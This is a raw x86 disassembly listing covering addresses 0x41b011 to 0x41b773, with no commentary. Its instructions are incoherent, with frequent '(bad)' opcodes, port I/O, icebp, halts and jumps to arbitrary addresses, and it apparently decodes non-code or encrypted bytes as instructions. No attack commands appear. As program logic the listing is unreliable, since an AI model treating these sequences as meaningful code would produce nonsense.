  41b011:	mov    dl,0xcd
  41b013:	inc    esp
  41b014:	retf   0xd071
  41b017:	or     eax,DWORD PTR [eax-0x767d719]
  41b01d:	sbb    eax,0x3ff7c346
  41b022:	in     al,0xa5
  41b024:	nop
  41b025:	dec    eax
  41b026:	mov    si,0x45a2
  41b02a:	dec    edx
  41b02b:	stc    
  41b02c:	test   al,0x61
  41b02e:	es jecxz 0x41b00a
  41b031:	push   edx
  41b032:	addr16 and ax,0xd744
  41b037:	fwait
  41b038:	rcl    DWORD PTR [ecx+0x69],0xe0
  41b03c:	pushf  
  41b03d:	sub    BYTE PTR [eax-0x5704b09d],0x99
  41b044:	inc    ebx
  41b045:	add    eax,0xd7c6b13e
  41b04a:	mov    DWORD PTR [ecx],ebp
  41b04c:	mov    edi,0xd9481bf5
  41b051:	shl    ah,cl
  41b053:	sahf   
  41b054:	std    
  41b055:	pop    es
  41b056:	ja     0x41b073
  41b058:	xor    esp,DWORD PTR ds:0xa2098560
  41b05e:	retf   0xc0a1
  41b061:	int3   
  41b062:	push   es
  41b063:	loope  0x41b023
  41b065:	pusha  
  41b066:	mov    BYTE PTR [ecx],ch
  41b068:	out    dx,eax
  41b069:	jmp    0x41b096
  41b06b:	xchg   ecx,eax
  41b06c:	shl    ebx,1
  41b06e:	jg     0x41b01f
  41b070:	mov    edi,0xf7013d96
  41b075:	loopne 0x41b0c1
  41b077:	leave  
  41b078:	setne  BYTE PTR [edi-0x7f099067]
  41b07f:	jno    0x41b0ca
  41b081:	push   esi
  41b082:	icebp  
  41b083:	stos   DWORD PTR es:[edi],eax
  41b084:	out    dx,eax
  41b085:	mov    dl,0x44
  41b087:	fmul   DWORD PTR [eax+0x2b]
  41b08a:	mov    ah,dh
  41b08c:	dec    edi
  41b08d:	lds    eax,FWORD PTR [ebx-0x39504daf]
  41b093:	das    
  41b094:	sub    al,0x8a
  41b096:	std    
  41b097:	test   BYTE PTR [eax-0x47],dh
  41b09a:	in     al,dx
  41b09b:	add    edx,ebx
  41b09d:	inc    edx
  41b09e:	xor    eax,0xc4e7ce7a
  41b0a3:	sbb    al,0x32
  41b0a5:	mov    ebx,0x9facf990
  41b0aa:	je     0x41b07e
  41b0ac:	cmp    DWORD PTR [esi-0x4a],edx
  41b0af:	lock xor al,0x8a
  41b0b2:	mov    ah,0x71
  41b0b4:	push   esi
  41b0b5:	xor    eax,0x5f8a1d01
  41b0ba:	push   0xffffffe7
  41b0bc:	mov    dh,0xd8
  41b0be:	dec    edx
  41b0bf:	dec    ecx
  41b0c0:	sbb    BYTE PTR [edi+0x591cdc43],al
  41b0c6:	test   al,0x26
  41b0c8:	push   ebx
  41b0c9:	fisttp WORD PTR [ebx*8-0x3d075198]
  41b0d0:	adc    eax,0xf4c2f03f
  41b0d5:	ja     0x41b119
  41b0d7:	stos   DWORD PTR es:[edi],eax
  41b0d8:	enter  0x1543,0xa8
  41b0dc:	and    DWORD PTR [edi],ebx
  41b0de:	dec    BYTE PTR [ecx+0x53a634f]
  41b0e4:	inc    edi
  41b0e5:	push   0x45
  41b0e7:	pop    ebx
  41b0e8:	xchg   edi,eax
  41b0e9:	scas   eax,DWORD PTR es:[edi]
  41b0ea:	out    0x7b,eax
  41b0ec:	add    al,0x63
  41b0ee:	(bad)  
  41b0ef:	push   ebp
  41b0f0:	fcmovnbe st,st(5)
  41b0f2:	jmp    0x41b15c
  41b0f4:	out    0x39,eax
  41b0f6:	mov    ecx,ebp
  41b0f8:	call   0xe6c:0x9e86b5d
  41b0ff:	push   esp
  41b100:	mov    BYTE PTR [edi-0x34b8c5f8],dl
  41b106:	les    ecx,FWORD PTR [esi]
  41b108:	xchg   ebx,eax
  41b109:	inc    edi
  41b10a:	jle    0x41b10f
  41b10c:	sbb    ebp,ecx
  41b10e:	rol    BYTE PTR [edx+0x38],0x7a
  41b112:	xor    DWORD PTR [ebx],ebx
  41b114:	and    eax,0x64bc993e
  41b119:	rcr    cl,cl
  41b11b:	aam    0x4b
  41b11d:	fs in  al,dx
  41b11f:	lods   eax,DWORD PTR ds:[esi]
  41b120:	pop    ss
  41b121:	pop    ss
  41b122:	jns    0x41b0d8
  41b124:	stos   BYTE PTR es:[edi],al
  41b125:	mov    dl,0x56
  41b127:	and    DWORD PTR [esi+edi*1],edi
  41b12a:	into   
  41b12b:	out    dx,al
  41b12c:	es pop es
  41b12e:	xchg   ebx,eax
  41b12f:	jge    0x41b145
  41b131:	mov    dl,0xa1
  41b133:	es jns 0x41b117
  41b136:	adc    al,0xb9
  41b138:	fst    QWORD PTR [ebp-0x7b1bbeab]
  41b13e:	into   
  41b13f:	ret    
  41b140:	add    bh,BYTE PTR [ebx+0x1791c7d9]
  41b146:	scas   eax,DWORD PTR es:[edi]
  41b147:	add    DWORD PTR [ebp+0x272f6ade],ebp
  41b14d:	das    
  41b14e:	push   eax
  41b14f:	or     eax,0x299ad8d8
  41b154:	ret    
  41b155:	mov    ch,0x60
  41b157:	mov    bl,0x82
  41b159:	dec    ebx
  41b15a:	cmc    
  41b15b:	dec    edx
  41b15c:	and    DWORD PTR [edx+edx*2+0x37722ddd],0xffffffd5
  41b164:	jae    0x41b11f
  41b166:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b167:	mov    al,ds:0x77d93a52
  41b16c:	jl     0x41b131
  41b16e:	stos   BYTE PTR es:[edi],al
  41b16f:	fadd   st(0),st
  41b171:	clc    
  41b172:	mov    cl,bh
  41b174:	mov    eax,0x35c955f0
  41b179:	(bad)  
  41b17a:	cdq    
  41b17b:	fnstsw WORD PTR [ecx-0x7b]
  41b17e:	adc    DWORD PTR [eax+0x71],ebx
  41b181:	daa    
  41b182:	sbb    ch,0x11
  41b185:	fbld   TBYTE PTR [edi]
  41b187:	xchg   BYTE PTR [edx+0x64202215],bh
  41b18d:	mov    ah,0x91
  41b18f:	rcl    DWORD PTR [ebp-0x2ecbbe85],1
  41b195:	mov    dh,0x3c
  41b197:	shl    ch,cl
  41b199:	inc    esi
  41b19a:	cdq    
  41b19b:	cmp    esp,ebx
  41b19d:	xor    BYTE PTR [edx+ebx*8-0xc0cda69],ah
  41b1a4:	cwde   
  41b1a5:	(bad)  
  41b1a6:	in     al,dx
  41b1a7:	add    al,BYTE PTR [edx+0x1ca0743b]
  41b1ad:	cwde   
  41b1ae:	or     eax,0x815a07c3
  41b1b3:	jb     0x41b18e
  41b1b5:	aaa    
  41b1b6:	add    al,BYTE PTR ds:0xb068b1a
  41b1bc:	push   ebp
  41b1bd:	int    0x9a
  41b1bf:	dec    edx
  41b1c0:	mov    al,0xe9
  41b1c2:	int    0x22
  41b1c4:	je     0x41b1ee
  41b1c6:	(bad)  
  41b1c7:	mov    bh,0xcf
  41b1c9:	(bad)  
  41b1ca:	mov    WORD PTR [ecx+0x239a300a],gs
  41b1d0:	jle    0x41b20f
  41b1d2:	jmp    0xc57166e2
  41b1d7:	fadd   QWORD PTR [ebp-0x78917ec7]
  41b1dd:	sbb    edx,DWORD PTR [ebp-0x68]
  41b1e0:	loop   0x41b212
  41b1e2:	and    ah,ah
  41b1e4:	lahf   
  41b1e5:	or     eax,0x68324b44
  41b1ea:	mov    dh,0x40
  41b1ec:	aas    
  41b1ed:	inc    esi
  41b1ee:	sub    BYTE PTR [esi-0x784e2710],ah
  41b1f4:	and    edx,eax
  41b1f6:	sbb    DWORD PTR [eax],0x30
  41b1f9:	pop    edx
  41b1fa:	rcr    BYTE PTR [eax-0x7f],0x1c
  41b1fe:	inc    esp
  41b1ff:	pop    edx
  41b200:	or     bl,bl
  41b202:	mov    al,0xe1
  41b204:	adc    al,0xc5
  41b206:	hlt    
  41b207:	inc    edx
  41b208:	pop    esi
  41b209:	add    al,0x17
  41b20b:	out    0x51,al
  41b20d:	jne    0x41b23e
  41b20f:	repnz mov eax,0x5acc6211
  41b215:	fdiv   QWORD PTR [ebp-0x16fcbb51]
  41b21b:	addr16 cld 
  41b21d:	gs mov edx,0x72551425
  41b223:	(bad)  
  41b224:	push   edi
  41b225:	(bad)  
  41b226:	cmp    BYTE PTR [edi+0x4f],bl
  41b229:	pop    es
  41b22a:	repnz cmp al,0x8
  41b22d:	inc    edx
  41b22e:	or     BYTE PTR [ebx+0x60],bh
  41b231:	in     eax,dx
  41b232:	test   eax,0xedd16cf0
  41b237:	or     DWORD PTR [edx-0x4a],eax
  41b23a:	pop    ebx
  41b23b:	mov    eax,ds:0xcbdff5ed
  41b240:	mov    ch,0x97
  41b242:	call   0xe3cc56b3
  41b247:	das    
  41b248:	inc    edx
  41b249:	test   al,0xe4
  41b24b:	dec    edx
  41b24c:	scas   eax,DWORD PTR es:[edi]
  41b24d:	int3   
  41b24e:	or     edi,DWORD PTR [esi+0x3c]
  41b251:	jle    0x41b2a1
  41b253:	push   ecx
  41b254:	enter  0xd864,0x1b
  41b258:	sar    BYTE PTR [ebx+0x28],cl
  41b25b:	mov    dh,BYTE PTR [ebx]
  41b25d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b25e:	cmc    
  41b25f:	(bad)  
  41b261:	(bad)  
  41b262:	clc    
  41b263:	ja     0x41b228
  41b265:	pusha  
  41b266:	push   ebx
  41b267:	adc    bl,BYTE PTR [eax+edi*2-0x71a55e9b]
  41b26e:	inc    ebx
  41b26f:	or     ecx,edx
  41b271:	pop    esi
  41b272:	and    DWORD PTR [ebx],ebx
  41b274:	ds pop edi
  41b276:	cmc    
  41b277:	dec    eax
  41b278:	(bad)  
  41b279:	mov    eax,0x37a07065
  41b27e:	(bad)  
  41b280:	(bad)  
  41b281:	out    0x8b,eax
  41b283:	mov    bl,0xe8
  41b285:	out    0xce,eax
  41b287:	cs push cs
  41b289:	clc    
  41b28a:	pop    edx
  41b28b:	cmp    eax,0xf89db369
  41b290:	push   esi
  41b291:	cmp    al,0x31
  41b293:	mov    edx,0x517d7c5f
  41b298:	inc    ecx
  41b299:	jns    0x41b25c
  41b29b:	cli    
  41b29c:	pop    esp
  41b29d:	enter  0x5163,0x2a
  41b2a1:	mov    fs,WORD PTR [eax-0x10eb8dc0]
  41b2a7:	cmp    DWORD PTR [ebx+0x34],ecx
  41b2aa:	push   ebx
  41b2ab:	test   al,0x4f
  41b2ad:	xchg   edx,eax
  41b2af:	fistp  QWORD PTR [esi-0x8]
  41b2b2:	cli    
  41b2b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2b4:	hlt    
  41b2b5:	das    
  41b2b6:	loop   0x41b313
  41b2b8:	pop    ds
  41b2b9:	clc    
  41b2ba:	xlat   BYTE PTR ds:[ebx]
  41b2bb:	stos   BYTE PTR es:[edi],al
  41b2bc:	mov    edi,0x50a64593
  41b2c1:	mov    edi,0x8c39fa8b
  41b2c6:	dec    edx
  41b2c7:	std    
  41b2c8:	jne    0x41b2e1
  41b2ca:	adc    eax,0xc32e6367
  41b2cf:	fisubr DWORD PTR fs:[esi]
  41b2d2:	dec    esp
  41b2d3:	sbb    eax,0x93fb30ad
  41b2d8:	inc    ebx
  41b2d9:	mov    ch,BYTE PTR [edi+0x5a]
  41b2dc:	neg    BYTE PTR [eax+0x61466779]
  41b2e2:	hlt    
  41b2e3:	pop    es
  41b2e4:	inc    ecx
  41b2e5:	hlt    
  41b2e6:	and    DWORD PTR [edx],ecx
  41b2e8:	aad    0xbc
  41b2ea:	mov    ds,WORD PTR [edi]
  41b2ec:	(bad)  
  41b2ed:	sbb    al,0x61
  41b2ef:	test   al,0x15
  41b2f1:	lea    eax,[ecx]
  41b2f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2f4:	push   eax
  41b2f5:	or     BYTE PTR [esp+edx*1],0x3c
  41b2f9:	dec    ecx
  41b2fa:	dec    ecx
  41b2fb:	cld    
  41b2fc:	mov    ebp,0x18056240
  41b301:	push   ebp
  41b302:	cmc    
  41b303:	imul   ecx,DWORD PTR [esp+ecx*8-0x77192fec],0x6f
  41b30b:	loopne 0x41b2cc
  41b30d:	jns    0x41b2c7
  41b30f:	xchg   ebp,eax
  41b310:	ins    BYTE PTR es:[edi],dx
  41b311:	call   0x5a28:0xc826f5e4
  41b318:	stos   DWORD PTR es:[edi],eax
  41b319:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b31a:	mov    DWORD PTR [edi+0x378d7982],ebp
  41b320:	pop    ss
  41b321:	in     eax,0x92
  41b323:	fadd   QWORD PTR [esi+0x5b427572]
  41b329:	rol    DWORD PTR [edi],1
  41b32b:	dec    esp
  41b32c:	ss ret 
  41b32e:	or     BYTE PTR [ecx],dh
  41b330:	adc    eax,0x984ca8fc
  41b335:	sahf   
  41b336:	ret    
  41b337:	out    0xaa,al
  41b339:	pop    esp
  41b33a:	xchg   DWORD PTR [ecx-0x7e7473dd],edx
  41b340:	cmp    DWORD PTR [edi],esp
  41b342:	ins    BYTE PTR es:[edi],dx
  41b343:	iret   
  41b344:	xchg   ecx,eax
  41b345:	ss jp  0x41b2fa
  41b348:	and    eax,0x93f1f506
  41b34d:	scas   eax,DWORD PTR es:[edi]
  41b34e:	mov    bh,0xae
  41b350:	inc    eax
  41b351:	push   0x6da7f119
  41b356:	sub    BYTE PTR [esi],dl
  41b358:	push   ss
  41b359:	xchg   ecx,eax
  41b35a:	sub    al,0xa7
  41b35c:	and    al,0x0
  41b35e:	lods   eax,DWORD PTR ds:[esi]
  41b35f:	inc    eax
  41b360:	cmp    edx,DWORD PTR ds:0x2f99e267
  41b366:	lahf   
  41b367:	cwde   
  41b368:	jno    0x41b2fe
  41b36a:	in     eax,dx
  41b36b:	push   ebx
  41b36c:	xchg   ebx,eax
  41b36d:	mov    edx,DWORD PTR ds:0xbd763f5
  41b373:	pop    ss
  41b374:	jl     0x41b378
  41b376:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b377:	mov    dh,al
  41b379:	mov    dh,0x38
  41b37b:	sbb    al,0x19
  41b37d:	cld    
  41b37e:	jnp    0x41b303
  41b380:	sbb    BYTE PTR [esi],cl
  41b382:	push   edx
  41b383:	dec    ecx
  41b384:	arpl   cx,bp
  41b386:	popf   
  41b387:	sbb    DWORD PTR [ecx+ebp*1+0x61],ebp
  41b38b:	cmp    eax,0xdab8b4a8
  41b390:	xchg   esp,eax
  41b391:	jns    0x41b33a
  41b393:	lods   eax,DWORD PTR ds:[esi]
  41b394:	into   
  41b395:	je     0x41b367
  41b397:	out    0x2c,eax
  41b399:	in     al,0x2f
  41b39b:	ror    ebp,1
  41b39d:	push   edx
  41b39e:	not    DWORD PTR [ecx+0x36]
  41b3a1:	or     eax,0xe16fdecd
  41b3a6:	jg     0x41b333
  41b3a8:	es icebp 
  41b3aa:	rcl    BYTE PTR [ebx],1
  41b3ac:	je     0x41b3b9
  41b3ae:	inc    BYTE PTR [ecx+0x3c]
  41b3b1:	ror    BYTE PTR [edi+0x53],1
  41b3b4:	cmp    DWORD PTR [eax+0x7972227],edi
  41b3ba:	dec    esi
  41b3bb:	push   es
  41b3bc:	adc    edi,DWORD PTR [eax]
  41b3be:	add    ah,0xaa
  41b3c1:	jae    0x41b3d6
  41b3c3:	inc    eax
  41b3c4:	mov    ecx,0xff1617f6
  41b3c9:	inc    edi
  41b3ca:	jmp    DWORD PTR [edx-0xb180bd9]
  41b3d0:	sbb    dh,BYTE PTR [ecx]
  41b3d2:	(bad)  
  41b3d3:	push   eax
  41b3d4:	das    
  41b3d5:	pop    ebp
  41b3d6:	(bad)  
  41b3d7:	mov    ebp,0x6f30050b
  41b3dc:	test   al,0x11
  41b3de:	push   esp
  41b3df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b3e0:	sub    bh,dl
  41b3e2:	hlt    
  41b3e3:	mov    dh,0x19
  41b3e5:	fcmovu st,st(3)
  41b3e7:	mov    bl,0xf8
  41b3e9:	pop    ss
  41b3ea:	xchg   DWORD PTR [edx+ebx*1+0x685dc3e6],esp
  41b3f1:	mov    ah,dh
  41b3f3:	pop    edi
  41b3f4:	mov    BYTE PTR [edi],ah
  41b3f6:	mov    ch,0xe0
  41b3f8:	xor    bh,0x3a
  41b3fb:	std    
  41b3fc:	lock cmc 
  41b3fe:	or     BYTE PTR [esi+0x744e8b5b],dl
  41b404:	or     eax,0x2d120467
  41b409:	push   ds
  41b40a:	sub    ch,BYTE PTR [eax]
  41b40c:	pop    ebp
  41b40d:	in     eax,0x24
  41b40f:	fmul   QWORD PTR [edi+0x15e03933]
  41b415:	mov    bl,0xd4
  41b417:	rcr    DWORD PTR [ebx+0x7a0b9de2],0xb7
  41b41e:	pop    esp
  41b41f:	inc    edi
  41b420:	leave  
  41b421:	test   al,0xb2
  41b423:	mov    dh,0xf7
  41b425:	dec    edi
  41b426:	mov    ch,BYTE PTR [ebp-0x1de16aeb]
  41b42c:	dec    ebx
  41b42d:	hlt    
  41b42e:	mov    DWORD PTR [edi-0x5a4c7691],esi
  41b434:	mov    BYTE PTR [edx-0x48],0x32
  41b438:	mov    al,ds:0x6fc9dadc
  41b43d:	dec    esp
  41b43e:	lds    ebx,FWORD PTR [edx-0x3088599e]
  41b444:	xlat   BYTE PTR ds:[ebx]
  41b445:	lods   eax,DWORD PTR ds:[esi]
  41b446:	popf   
  41b447:	and    al,0x0
  41b449:	rcl    esi,cl
  41b44b:	enter  0x5c7e,0xae
  41b44f:	shl    DWORD PTR [edi-0x184a53ae],1
  41b455:	push   ebx
  41b456:	inc    BYTE PTR [ecx+0x2e30b9c1]
  41b45c:	push   edi
  41b45d:	push   es
  41b45e:	pop    edx
  41b45f:	lods   al,BYTE PTR ds:[esi]
  41b460:	and    eax,0xd4f0a592
  41b465:	hlt    
  41b466:	pop    ebx
  41b467:	pop    es
  41b468:	jnp    0x41b479
  41b46a:	dec    ebx
  41b46b:	call   0xc37e:0x465dae0b
  41b472:	sahf   
  41b473:	loopne 0x41b47c
  41b475:	sub    esp,edx
  41b477:	daa    
  41b478:	(bad)  
  41b479:	(bad)  
  41b47a:	aas    
  41b47b:	or     BYTE PTR [eax*4-0x496bcaf1],0x5c
  41b483:	popf   
  41b484:	xchg   ebx,eax
  41b485:	lss    ebp,FWORD PTR [esi]
  41b488:	adc    DWORD PTR [ecx+0x32],ecx
  41b48b:	adc    eax,0x86f8a3b8
  41b490:	pop    ss
  41b491:	mov    es,WORD PTR [esi+0x1b]
  41b494:	xchg   BYTE PTR [edx-0x46d5f3e4],ah
  41b49a:	xor    eax,0x24e0847d
  41b49f:	outs   dx,BYTE PTR ds:[esi]
  41b4a0:	loopne 0x41b476
  41b4a2:	inc    eax
  41b4a3:	es je  0x41b45e
  41b4a6:	mov    esp,?
  41b4a8:	pop    ds
  41b4a9:	aad    0xb2
  41b4ab:	scas   al,BYTE PTR es:[edi]
  41b4ac:	pop    ss
  41b4ad:	popf   
  41b4ae:	fsubrp st(3),st
  41b4b0:	mov    ch,0x56
  41b4b2:	icebp  
  41b4b3:	retf   0x4f44
  41b4b6:	xor    DWORD PTR [ebx],0xffffffe5
  41b4b9:	jmp    0x9c7ddcc
  41b4be:	loopne 0x41b468
  41b4c0:	in     al,dx
  41b4c1:	cmc    
  41b4c2:	imul   eax,DWORD PTR [edi],0xffffffa7
  41b4c5:	pop    es
  41b4c6:	test   BYTE PTR [ebx+0x65f6a828],al
  41b4cc:	or     ch,ah
  41b4ce:	cmp    DWORD PTR [ebx-0x183676d3],edi
  41b4d4:	addr16 out 0xe5,eax
  41b4d7:	jo     0x41b4fb
  41b4d9:	or     edi,0x1dd75d0d
  41b4df:	popf   
  41b4e0:	ja     0x41b502
  41b4e2:	xor    dl,cl
  41b4e4:	dec    esi
  41b4e5:	push   es
  41b4e6:	rol    BYTE PTR [esi-0x17],cl
  41b4e9:	and    BYTE PTR [edi+0x41],bh
  41b4ec:	adc    ecx,DWORD PTR [eax+0x1cfd9dc9]
  41b4f2:	jle    0x41b4e1
  41b4f4:	data16 out dx,al
  41b4f6:	mov    WORD PTR [esi+0x17],gs
  41b4f9:	push   esi
  41b4fa:	adc    al,0x9e
  41b4fc:	in     al,0x17
  41b4fe:	pop    ss
  41b4ff:	push   cs
  41b500:	scas   eax,DWORD PTR es:[edi]
  41b501:	pop    ebp
  41b502:	or     eax,0x61dd546d
  41b507:	mov    ah,0xcd
  41b509:	test   al,0x9
  41b50b:	push   ebx
  41b50c:	cs das 
  41b50e:	cwde   
  41b50f:	push   esp
  41b510:	add    eax,0xe263ddc5
  41b515:	mov    ds:0x53bcdf1d,al
  41b51a:	cmp    al,0x62
  41b51c:	das    
  41b51d:	mov    eax,ds:0x15199147
  41b522:	imul   ebx,DWORD PTR [edi+0x35],0x5a5c546b
  41b529:	fistp  DWORD PTR [ebp+0x1d83e212]
  41b52f:	push   0x51
  41b531:	inc    ebp
  41b532:	gs pop esi
  41b534:	mov    gs,WORD PTR [ebx]
  41b536:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b537:	into   
  41b538:	repz jae 0x41b4cf
  41b53b:	sbb    eax,0xf6ca0df6
  41b540:	pop    ecx
  41b541:	jae    0x41b4d9
  41b543:	or     al,0x6e
  41b545:	mov    bh,0x8d
  41b547:	or     dh,bh
  41b549:	cmc    
  41b54a:	inc    edx
  41b54b:	dec    edi
  41b54c:	adc    BYTE PTR [ecx-0x73],dl
  41b54f:	out    0x8d,eax
  41b551:	popa   
  41b552:	cmp    al,0x12
  41b554:	mov    dl,0x18
  41b556:	jle    0x41b50e
  41b558:	jge    0x41b567
  41b55a:	test   ah,ch
  41b55c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b55d:	or     ebp,DWORD PTR [esi+edx*2]
  41b560:	sar    DWORD PTR [ebx],cl
  41b562:	sub    cl,BYTE PTR [ecx+0x32d3aa]
  41b568:	retf   
  41b569:	jno    0x41b56d
  41b56b:	mov    bl,0x3a
  41b56d:	cmp    BYTE PTR [eax-0x4a0bbfa3],0xc8
  41b574:	jbe    0x41b569
  41b576:	pop    ebp
  41b577:	or     al,0x6a
  41b579:	bound  esi,QWORD PTR [eax-0x48]
  41b57c:	xchg   ebx,eax
  41b57d:	lods   al,BYTE PTR ds:[esi]
  41b57e:	enter  0x829,0x4b
  41b582:	or     DWORD PTR ds:0x662b49a4,esp
  41b588:	push   ebp
  41b589:	jb     0x41b5ec
  41b58b:	(bad)  
  41b58c:	popf   
  41b58d:	retf   
  41b58e:	test   eax,0x37919168
  41b593:	sahf   
  41b594:	fldenv ds:0xec54f1f5
  41b59a:	and    DWORD PTR [ebx+0xe],ecx
  41b59d:	sar    cl,1
  41b59f:	aas    
  41b5a0:	add    ebx,eax
  41b5a2:	push   esp
  41b5a3:	iret   
  41b5a4:	iret   
  41b5a5:	pop    ss
  41b5a6:	pop    edi
  41b5a7:	in     eax,0xdf
  41b5a9:	dec    ecx
  41b5aa:	cmp    eax,0x425e9ffd
  41b5af:	dec    ebp
  41b5b0:	clc    
  41b5b1:	adc    al,0x9a
  41b5b3:	dec    eax
  41b5b4:	ret    0xb4e3
  41b5b7:	inc    edi
  41b5b8:	xchg   esp,eax
  41b5b9:	mov    eax,ds:0x9d110359
  41b5be:	inc    eax
  41b5bf:	cwde   
  41b5c0:	pop    esp
  41b5c1:	icebp  
  41b5c2:	cmp    eax,0xe50c8550
  41b5c7:	ins    BYTE PTR es:[edi],dx
  41b5c8:	and    eax,edx
  41b5ca:	cmp    al,0x2
  41b5cc:	mov    esi,0x6ac9d218
  41b5d1:	mov    ebx,0xc25e4e15
  41b5d6:	imul   ecx,DWORD PTR [esp+edx*8-0x9],0xffffff86
  41b5db:	add    BYTE PTR [esi],cl
  41b5dd:	sub    BYTE PTR ds:0xc928d005,al
  41b5e3:	sbb    esi,DWORD PTR [esp+ebp*2]
  41b5e6:	sub    cl,al
  41b5e8:	mov    ch,0x2c
  41b5ea:	jl     0x41b5e4
  41b5ec:	mov    al,ds:0x711f42f7
  41b5f1:	add    ch,bh
  41b5f3:	jg     0x41b5be
  41b5f5:	loope  0x41b5a9
  41b5f7:	add    esi,ecx
  41b5f9:	or     cl,BYTE PTR [ebx]
  41b5fb:	jmp    0xcc0e85d6
  41b600:	add    ah,BYTE PTR [ecx-0x6e]
  41b603:	xor    al,0xd1
  41b605:	js     0x41b587
  41b607:	leave  
  41b608:	cwde   
  41b609:	pop    ss
  41b60a:	das    
  41b60b:	push   cs
  41b60c:	pusha  
  41b60d:	fnstcw WORD PTR [edi+ecx*4+0x10]
  41b611:	rol    ecx,0x82
  41b614:	xor    bh,dl
  41b616:	daa    
  41b617:	xor    ebp,DWORD PTR [eax-0x25a67b1c]
  41b61d:	ds ja  0x41b5ff
  41b620:	cmp    ebp,edi
  41b622:	std    
  41b623:	call   0x22b96de0
  41b628:	outs   dx,DWORD PTR ds:[esi]
  41b629:	das    
  41b62a:	out    0x35,eax
  41b62c:	rol    BYTE PTR [ebx],1
  41b62e:	mov    ebx,0x91ee5762
  41b633:	lahf   
  41b634:	pop    edi
  41b635:	(bad)
  41b638:	xchg   DWORD PTR [ebx+edi*4-0x63984533],ebx
  41b63f:	cmp    esi,0x6b6d4db7
  41b645:	mov    ecx,0xae6cfd6b
  41b64a:	sahf   
  41b64b:	dec    esp
  41b64c:	lea    ebp,[esi+0x46ea1ffc]
  41b652:	xor    esi,ebx
  41b654:	div    dl
  41b656:	lahf   
  41b657:	ror    DWORD PTR [edi-0x70],cl
  41b65a:	ja     0x41b683
  41b65c:	loop   0x41b642
  41b65e:	mov    esi,0xcd65cdbd
  41b663:	jno    0x41b602
  41b665:	xchg   ebx,eax
  41b666:	push   cs
  41b667:	and    BYTE PTR [edi+0x23425899],bh
  41b66d:	sbb    al,0x64
  41b66f:	retf   
  41b670:	test   dl,0x93
  41b673:	pop    esi
  41b674:	xchg   esi,eax
  41b675:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b676:	clc    
  41b677:	mov    edx,DWORD PTR [ebp+0x5976aa0a]
  41b67d:	mov    ch,BYTE PTR [ebx-0x53061b2a]
  41b683:	ret    
  41b684:	xor    ecx,ebx
  41b686:	ror    DWORD PTR [ebp-0x59431f79],0x5c
  41b68d:	dec    ecx
  41b68e:	sub    BYTE PTR [edi+0x5d16eb4f],dh
  41b694:	mov    ds:0xed9d660,al
  41b699:	imul   ecx,DWORD PTR [esi],0x2f
  41b69c:	stc    
  41b69d:	add    dh,bh
  41b69f:	mov    bh,0x6c
  41b6a1:	mov    ds:0x2e7e3123,al
  41b6a6:	pop    ecx
  41b6a7:	stc    
  41b6a8:	div    esp
  41b6aa:	add    eax,0xe6f69e2d
  41b6af:	push   eax
  41b6b0:	pop    esp
  41b6b1:	test   eax,0x68c6866c
  41b6b6:	dec    ebx
  41b6b7:	push   0xffffff84
  41b6b9:	mov    bh,0xb5
  41b6bb:	je     0x41b6fd
  41b6bd:	out    dx,eax
  41b6be:	shr    dl,1
  41b6c0:	dec    edx
  41b6c1:	xchg   edx,eax
  41b6c2:	jnp    0x41b6fd
  41b6c4:	shr    DWORD PTR [eax],cl
  41b6c6:	push   ss
  41b6c7:	inc    esi
  41b6c8:	int3   
  41b6c9:	add    al,0x32
  41b6cb:	inc    esi
  41b6cc:	dec    eax
  41b6cd:	jnp    0x41b725
  41b6cf:	maskmovq mm7,mm1
  41b6d2:	mov    bh,0xee
  41b6d4:	add    al,0x46
  41b6d6:	sub    esp,DWORD PTR [ebp+0x3d7a5c20]
  41b6dc:	xchg   ecx,eax
  41b6dd:	inc    ebp
  41b6de:	push   ds
  41b6df:	test   al,0x74
  41b6e1:	leave  
  41b6e2:	cmp    ah,BYTE PTR [edi]
  41b6e4:	or     eax,0x67d524b4
  41b6e9:	retf   
  41b6ea:	jo     0x41b755
  41b6ec:	or     bl,BYTE PTR [edi-0x17]
  41b6ef:	dec    ebx
  41b6f0:	jge    0x41b73b
  41b6f2:	fwait
  41b6f3:	push   edx
  41b6f4:	xchg   edi,eax
  41b6f5:	lahf   
  41b6f6:	fistp  DWORD PTR [edi]
  41b6f8:	mov    dl,0x4e
  41b6fa:	retf   0xf3b2
  41b6fd:	hlt    
  41b6fe:	jae    0x41b6b5
  41b700:	sbb    BYTE PTR [eax+0xe8fed82],dh
  41b706:	popa   
  41b707:	fimul  DWORD PTR [edi+0x40658e7c]
  41b70d:	mov    ebx,0x552d0fbf
  41b712:	fwait
  41b713:	loopne 0x41b6f7
  41b715:	and    DWORD PTR [ebp-0x561d2196],edi
  41b71b:	push   0xffffff9a
  41b71d:	hlt    
  41b71e:	cmc    
  41b71f:	jmp    0xa9965069
  41b724:	es (bad) 
  41b727:	cmp    al,0xb4
  41b729:	js     0x41b75c
  41b72b:	mov    eax,0xef09081d
  41b730:	pop    es
  41b731:	loopne 0x41b799
  41b733:	push   eax
  41b734:	std    
  41b735:	(bad)  
  41b736:	jmp    0x41b74a
  41b738:	xchg   ebx,eax
  41b739:	das    
  41b73a:	fsub   st,st(4)
  41b73c:	rcr    ebp,1
  41b73e:	mov    edx,0x516857b4
  41b743:	sub    dl,ch
  41b745:	mov    al,ds:0x519c02c4
  41b74a:	fdivr  DWORD PTR [edx-0x706f96f2]
  41b750:	gs loop 0x41b7a2
  41b753:	mov    esi,0xa000f825
  41b758:	push   eax
  41b759:	mov    ebp,0x7725129c
  41b75e:	iret   
  41b75f:	stos   DWORD PTR es:[edi],eax
  41b760:	lods   eax,DWORD PTR ds:[esi]
  41b761:	(bad)  
  41b762:	dec    esp
  41b763:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b765:	adc    eax,0x351cbe3d
  41b76a:	mov    eax,0x5e9c8019
  41b76f:	xchg   esi,eax
  41b770:	pop    eax
  41b771:	dec    esp
  41b772:	outs   dx,DWORD PTR ds:[esi]
  41b773:	xchg   edi,eax
